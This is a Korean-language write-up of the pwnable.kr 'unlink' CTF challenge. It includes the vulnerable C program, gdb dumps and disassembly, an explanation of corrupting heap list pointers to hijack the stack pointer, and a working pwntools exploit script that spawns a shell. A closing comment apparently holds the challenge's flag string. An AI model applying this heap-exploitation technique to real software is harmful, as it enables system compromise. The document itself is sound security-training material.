---
title: "pwnable.kr - Toddler's bottle #18 unlink"
date: 2020-03-09
categories:
  - Information Security
tags:
  - pwnable.kr
---

[pwnable.kr][pwnable.kr] Toddler's bottle의 #18 unlink 문제 풀이

unlink.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
        struct tagOBJ* fd;
        struct tagOBJ* bk;
        char buf[8];
}OBJ;

void shell(){
        system("/bin/sh");
}

void unlink(OBJ* P){
        OBJ* BK;
        OBJ* FD;
        BK=P->bk;
        FD=P->fd;
        FD->bk=BK;
        BK->fd=FD;
}
int main(int argc, char* argv[]){
        malloc(1024);
        OBJ* A = (OBJ*)malloc(sizeof(OBJ));
        OBJ* B = (OBJ*)malloc(sizeof(OBJ));
        OBJ* C = (OBJ*)malloc(sizeof(OBJ));

        // double linked list: A <-> B <-> C
        A->fd = B;
        B->bk = A;
        B->fd = C;
        C->bk = B;

        printf("here is stack address leak: %p\n", &A);
        printf("here is heap address leak: %p\n", A);
        printf("now that you have leaks, get shell!\n");
        // heap overflow!
        gets(A->buf);

        // exploit this unlink!
        unlink(B);
        return 0;
}
```

gdb
~~~
here is stack address leak: 0xffbb0884
here is heap address leak: 0x9d13410
now that you have leaks, get shell!

(gdb) x/10x 0xffbb0884
0xffbb0884:     0x09d13410      0x09d13440      0x09d13428      0xf77953dc
0xffbb0894:     0xffbb08b0      0x00000000      0xf75fb637      0xf7795000
0xffbb08a4:     0xf7795000      0x00000000

(gdb) x/20x 0x9d13410-0x4
0x9d1340c:      0x00000019      0x09d13428      0x00000000      0x00000000
0x9d1341c:      0x00000000      0x00000000      0x00000019      0x09d13440
0x9d1342c:      0x09d13410      0x00000000      0x00000000      0x00000000
0x9d1343c:      0x00000019      0x00000000      0x09d13428      0x00000000
0x9d1344c:      0x00000000      0x00000000      0x00000409      0x20776f6e
~~~

저 결과를 보기 쉽게 정리하면 이렇다  
~~~
-4   chunk size = 0x18 & used flag 1 = 0x19
 0   A->fd = 0x09d13428
 4   A->bk = 0x00000000
 8   A->buf[0-3]
12   A->buf[4-7]
16   비어있음
20   chunk size 0x18 & 1
24   B->fd = 0x09d13440 (=A)
28   B->bk = 0x09d13410 (=C)
32   B->buf[0-3]
36   B->buf[0-3]
40   비어 있음
44   chunk size 0x18 & 1   
48   C->fd = 0x00000000
52   C->bk = 0x09d13428
56   C->buf[0-3]
60   C->buf[4-7]
~~~

왜 chunk size는 0x14가 아니라 0x19라고 써져 있나?  
찾아보니 malloc은 8byte 단위로 밖에 블럭 생성이 안된다고 한다...  
헤더 4byte + 실제 필요한 16byte하면 20byte = 0x14인데 여기서 가장 가까운 8byte 단위가 0x18  
마지막 bit은 사용중인 블럭이라는 flag setting 인것 같다  

gets하면 A->buf에서 부터 B,C의 내용을 전부다 덮어 쓸수 있다  

그럼 뭐라고 덮어쓰면 좋을까?  

예전에 FTZ 풀때 dtors라는걸 활용한 기억이 났다.  
dtors는 destructor로 main이 종료된 이후에 실행되는 것이다.  
termination function이라는데 정확히 하는게 뭔지는 모르겠다...  
다만 사용자가 직접 추가해서 컴파일 할수도 있는걸로 봐서는 그냥 프로그램이 끝낼때 무조건 해야 하는일을 모아놓는 곳인듯 하다.  

중요한건 저길 덮어쓰면 내가 원하는 것을 실행할 수 있다는 것이다.  

그런데 objdump로 보려 하니 .dtors가 안보인다  

~~~
unlink@pwnable:~$ objdump -s -j .dtors ./unlink

./unlink:     file format elf32-i386

objdump: section '.dtors' mentioned in a -j option, but not found in any input file
~~~

좀 당황했는데 약간 더 파보니 이런게 나왔다  
~~~
unlink@pwnable:~$ objdump -x ./unlink | grep dtors
080484a0 l     F .text  00000000              __do_global_dtors_aux
08049f0c l     O .fini_array    00000000              __do_global_dtors_aux_fini_array_entry
~~~

이름은 다르지만 뭔가 저게 내가 아는 그 dtors인것 같아서 gdb에 breakpoint를 걸어보았다  
~~~
(gdb) c
Continuing.
aaaa

Breakpoint 2, 0x080484a0 in __do_global_dtors_aux ()

(gdb) disas 0x80484a0
Dump of assembler code for function __do_global_dtors_aux:
   0x080484a0 <+0>:     cmpb   $0x0,0x804a02c
   0x080484a7 <+7>:     jne    0x80484bc <__do_global_dtors_aux+28>
   0x080484a9 <+9>:     push   %ebp
   0x080484aa <+10>:    mov    %esp,%ebp
   0x080484ac <+12>:    sub    $0x8,%esp
   0x080484af <+15>:    call   0x8048430 <deregister_tm_clones>
   0x080484b4 <+20>:    movb   $0x1,0x804a02c
   0x080484bb <+27>:    leave
   0x080484bc <+28>:    repz ret
   0x080484be <+30>:    xchg   %ax,%ax
~~~

그렇다면 .fini_array가 내가 아는 \_\_DTORS\_LIST\_\_ 인걸까?  

~~~
Breakpoint 2, 0x080484a0 in __do_global_dtors_aux ()
(gdb) x/10x 0x8049f0c
0x8049f0c:      0x080484a0      0x00000000      0x00000001      0x00000001
0x8049f1c:      0x0000000c      0x08048348      0x0000000d      0x08048674
0x8049f2c:      0x00000019      0x08049f08
~~~

맞는것 같다. 그렇다면 내가 하고 싶은 것은 0x8049f0c의 내용을 소스코드의 shell로 바꿔치기 하는 것일 것이다  
~~~
(gdb) print shell
$1 = {<text variable, no debug info>} 0x80484eb <shell>
~~~

unlink를 하는 asm을 보면 대략 이렇다  
~~~
(gdb) disas unlink
Dump of assembler code for function unlink:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     sub    $0x10,%esp
   0x0804850a <+6>:     mov    0x8(%ebp),%eax    // ebp+8에서 P가져 옴. eax = P
   0x0804850d <+9>:     mov    0x4(%eax),%eax    // eax = P->bk
   0x08048510 <+12>:    mov    %eax,-0x4(%ebp)   // BK = P->bk = ebp-4
   0x08048513 <+15>:    mov    0x8(%ebp),%eax    // ebp+8에서 P가져 옴. eax = P
   0x08048516 <+18>:    mov    (%eax),%eax       // eax = P->fd
   0x08048518 <+20>:    mov    %eax,-0x8(%ebp)   // FD = P->fd = ebp-8
   0x0804851b <+23>:    mov    -0x8(%ebp),%eax   // eax = ebp-8 = FD
   0x0804851e <+26>:    mov    -0x4(%ebp),%edx   // edx = ebp-4 = BK
   0x08048521 <+29>:    mov    %edx,0x4(%eax)    // FD->bk = edx = BK
   0x08048524 <+32>:    mov    -0x4(%ebp),%eax   // eax = ebp-4 = BK
   0x08048527 <+35>:    mov    -0x8(%ebp),%edx   // edx = ebp-8 = FD
   0x0804852a <+38>:    mov    %edx,(%eax)       // BK->fd = edx = FD
   0x0804852c <+40>:    nop
   0x0804852d <+41>:    leave
   0x0804852e <+42>:    ret
~~~

```c
void unlink(OBJ* P){
        OBJ* BK;
        OBJ* FD;
        BK=P->bk;
        FD=P->fd;
        FD->bk=BK;
        BK->fd=FD;
}
```

아 어셈 어렵다... 머리 안돌아간다...  

뭐 여튼 C코드 그대로 한다  

결론적으로  

~~~
*(B)+4 = *(B)
*(B) = *(B+4)
~~~

인 셈이니까 B에 0x8049f0c-4, B+4에 0x80484eb 를 넣으면 되...려...나...?  

~~~
BK = 0x80484eb  
FD = 0x8049f0c-4  
FD->bk = 0x8049f0c-4+4 = 0x80484eb  
BK->fd = 0x80484eb = 0x8049f0c-4 ?  
~~~

음.... 이러면 segmentation fault가 뜰것이다. 코드영역은 writable하지 않다. 그렇다면 어떻게?  

처음엔 stack에 shell코드를 올리고 stack값과 do_global_dtors_aux_fini_array_entry를 BK, FD에 주면 되지 않을까 하고 생각해 봤지만, 문제가 어떻게 해도 stack에 do_global_dtors_aux_fini_array_entry의 주소가 적힐 것이기 때문에 do_global_dtors_aux_fini_array_entry에 shell코드 주소가 들어가더라도 shell코드는 do_global_dtors_aux_fini_array_entry 주소에 의해 오염된 상태일 거라는 것이다.  

주소를 disassembly해보니 아무 의미 없는 것도 아니고, register상태에 따라 크래시가 날수도 있을것 같아 이 방법은 역시 아닌것 같았다.  

한참 해매다가 결국 다른 사람의 풀이를 찾아보았다. 그리고 그제서야 이게 약간의 함정이 있는 문제라는걸 알았다. ㅠㅠ  

아래는 main 함수의 마지막 부분을 disas 한 것이다  

~~~
   0x080485f2 <+195>:   call   0x8048504 <unlink>
   0x080485f7 <+200>:   add    $0x10,%esp
   0x080485fa <+203>:   mov    $0x0,%eax
   0x080485ff <+208>:   mov    -0x4(%ebp),%ecx
   0x08048602 <+211>:   leave
   0x08048603 <+212>:   lea    -0x4(%ecx),%esp
   0x08048606 <+215>:   ret
~~~

보면 이상하게도 leave 후 바로 ret하는게 아니라 뭔가 다른걸 한다.  

ebp-4에 있는 것을 ecx에 넣은 다음 leave를 하고(ebp값을 esp에 저장) ecx-4의 값을 esp에 넣은 다음 ret한다(pop eip, jmp eip)  

만약 ebp-4 에 우리가 원하는 값을 넣을 수 있다면 우리는 esp를 컨트롤할 수 있게 되고 이를 이용해서 eip를 컨트롤 할 수 있다.  

그리고 esp가 참조할 값은 ecx-4 에 있는 값이지 ecx에 있는 값이 아니므로, ecx에 뭘 덮어쓰던 상관 없다.  
그 위에 있는 값이 중요하니까.  

즉 BK-4에 shell함수의 주소, BK에는 BK에 해당하는 힙주소, FD에는 A의 주소 + 0x10을 넣으면 된다  

왜 A의 주소 + 0x10을 넣느냐면 A가 ebp-0x14이기 때문이다.  

그럼 이제 아래와 같이 채워 넣으면 된다  

~~~
-4  chunk size = 0x18 & used flag 1 = 0x19  
 0   A->fd = 0x09d13428        (여기가 leak 되는 heap주소)
 4   A->bk = 0x00000000
------------여기서 부터 써진다-----------------------------
 8   shell의 주소 = 0x80484eb   (A->buf[0-3])
12   aaaa                       (A->buf[4-7])
16   aaaa                       (원래 비어있음)
20   aaaa                       (chunk size 0x18 & 1)
24   leaked heap addr + 12      (B->fd)
28   leaked stack addr + 16     (B->bk)
------------여기 부터는 상관 없음----------------------------
32   B->buf[0-3]
36   B->buf[0-3]
40   비어 있음
44   chunk size 0x18 & 1   
48   C->fd = 0x00000000
52   C->bk = 0x09d13428
56   C->buf[0-3]
60   C->buf[4-7]
~~~

이렇게 되면  

B->fd = leaked heap addr + 12  
FD->bk는 +4이므로,  
(leaked heap addr + 12) + 4 = leaked stack addr + 16  

B->bk = leaked stack addr + 16 (= A+0x10 = ebp-0x4)  
BK->fd는 +0이므로,  
(leaked stack addr + 16) = (ebp-4) = leaked heap addr + 12  

그런 다음 ecx에는 ebp-4에 있는 leaked heap addr + 12를 가져오고  
여기에 -4한 leaked heap addr +8을 pop eip, jmp eip 하게 된다.  
그리고 8에는 이미 들어간 shell의 주소가 있다  

주소를 받아서 그걸 계산해서 binary로 넣어야 하기 때문에 이 문제는 pwntool같은걸 쓰는게 필수다.  
좀 익혀둘 필요가 있을것 같다...  

```python
from __future__ import print_function
from pwn import *
import re
import sys

ssh = ssh(user='unlink', host='pwnable.kr', port=2222, password='guest')
s = ssh.process('/home/unlink/unlink')

leakStr = s.recvuntil('now that') 
stackAddr, heapAddr = re.findall("(0x[a-fA-F0-9]+)\n", leakStr)
stackAddr, heapAddr = int(stackAddr,16), int(heapAddr,16)

log.success('Address of local variable A: '+hex(stackAddr))
log.success('Address of heap allocated A: '+hex(heapAddr))

payload = p32(0x80484eb) # address of shell
payload += 'a'*12
payload += p32(heapAddr + 12)
payload += p32(stackAddr + 16)

s.sendlineafter('get shell!\n', payload)
s.interactive()
```

풀기는 풀었는데 결국 다른 사람의 해답을 참고했어야 했어서 아쉽다.  
괜히 dtors에 사로잡혀서 안되는걸 붙들고 있었다.  
역시 이 분야는 진입장벽이 높은것 같다.  


[pwnable.kr]: https://pwnable.kr

<!-- conditional_write_what_where_from_unl1nk_explo1t -->